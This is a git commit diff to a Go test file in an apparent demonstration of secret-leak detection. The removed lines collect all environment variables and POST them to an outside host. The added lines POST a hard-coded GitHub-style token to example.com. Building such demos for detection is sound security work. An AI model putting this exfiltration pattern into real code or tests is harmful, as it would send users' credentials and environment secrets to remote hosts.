7065c2cf148e0965b0f57ed4bfdba31ce4dff420
Umesh Sirsiwal <775335+usirsiwal@users.noreply.github.com>
2023-05-04 10:41:40 -0400

    fix secret leak demo (#25)
    Co-authored-by: Umesh Sirsiwal <umesh@sirsiwal.in>

--- demo/secret/demo/demo_test.go
+++ demo/secret/demo/demo_test.go
@@ -2,19 +2,21 @@ package main
 
 import (
 	"bytes"
-	"encoding/json"
 	"fmt"
 	"net/http"
-	"os"
 	"testing"
+
+	"github.com/stretchr/testify/require"
 )
 
 func TestDemo(t *testing.T) {
-	env := os.Environ()
-//	env = append(env, "GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX")
-	data, _ := json.Marshal(env)
-	r := bytes.NewReader(data)
-	req, _ := http.NewRequest("POST", "https://app.a.invisirisk.com/post-target", r)
+	//env := os.Environ()
+	data := `{
+		"GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX",
+	}`
+	r := bytes.NewReader([]byte(data))
+	req, _ := http.NewRequest("POST", "https://example.com/post-target", r)
 	resp, err := http.DefaultClient.Do(req)
+	require.NoError(t, err)
 	fmt.Printf("response code %v error %v\n", resp.StatusCode, err)
 }
